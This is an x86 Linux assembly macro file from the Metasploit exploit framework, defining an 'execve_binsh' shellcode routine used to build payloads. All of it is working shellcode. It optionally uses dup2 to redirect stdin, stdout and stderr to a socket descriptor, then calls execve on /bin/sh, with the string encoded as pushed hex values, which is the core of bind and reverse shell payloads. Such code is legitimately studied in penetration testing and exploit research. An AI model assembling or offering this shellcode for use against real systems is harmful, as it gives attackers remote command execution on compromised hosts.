;;
;
;        Name: generic
;        Type: Macro Set
;   Qualities: None
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This file provides a generic API of macros that can be used
;        by payloads.  No payloads are actually implemented within this
;        file.
;
; Macro List:
;
;        execve_binsh - Executes a command shell with flags
;;
BITS 32

;;
;     Macro: execve_binsh
;   Purpose: Execute a command shell with various options
; Arguments:
;
;    Execution flags: Flags used for executing the command shell in a 
;                     number of modes.
;
;        EXECUTE_REDIRECT_IO      => Redirects stdin/stdout/stderr to the fd
;                                    passed in 'edi'.
;        EXECUTE_DISABLE_READLINE => Disables readline support.  This is 
;                                    needed for redirection to UDP sockets.
;;
%define EXECUTE_REDIRECT_IO      0x0001
%define EXECUTE_DISABLE_READLINE 0x0002

%macro execve_binsh 1

	%if %1 & EXECUTE_REDIRECT_IO

dup:
	mov  ebx, edi
	push byte 0x2
	pop  ecx
dup_loop:
	push byte 0x3f
	pop  eax
	int  0x80
	dec  ecx
	jns  dup_loop

	%endif

execve:

	push byte 0xb
	pop  eax
	cdq
	push edx

	%if %1 & EXECUTE_DISABLE_READLINE

	push word 0x692d
	mov  ecx, esp
	push byte 0x67
	push word 0x6e69
	push dword 0x74696465
	push dword 0x6f6e2d2d
	mov  edi, esp
	push edx
	push dword 0x68732f2f
	push dword 0x6e69622f

	%else

	push dword 0x68732f2f
	push dword 0x6e69622f

	%endif

	mov  ebx, esp
	push edx

	%if %1 & EXECUTE_DISABLE_READLINE

	push ecx
	push edi

	%endif
	
	push ebx
	mov  ecx, esp
	int  0x80

%endmacro
